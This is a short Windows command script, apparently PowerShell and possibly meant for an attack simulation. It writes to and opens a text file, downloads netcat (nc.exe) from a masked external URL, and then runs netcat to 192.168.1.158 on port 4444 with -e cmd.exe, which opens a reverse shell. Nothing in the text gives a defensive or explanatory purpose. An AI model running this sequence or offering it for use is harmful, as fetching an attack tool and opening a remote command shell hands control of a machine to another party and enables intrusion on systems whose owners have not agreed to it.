echo "hi" >> "C:\temp\important_document.txt"
notepad.exe "C:\temp\important_document.txt"
(New-Object net.webclient).DownloadFile("https://XXXXXXXXXXXXXXXXX/nc.exe", "C:\seclogs\nc.exe")
Start-Sleep -Seconds 5
nc.exe 192.168.1.158 4444 -e cmd.exe
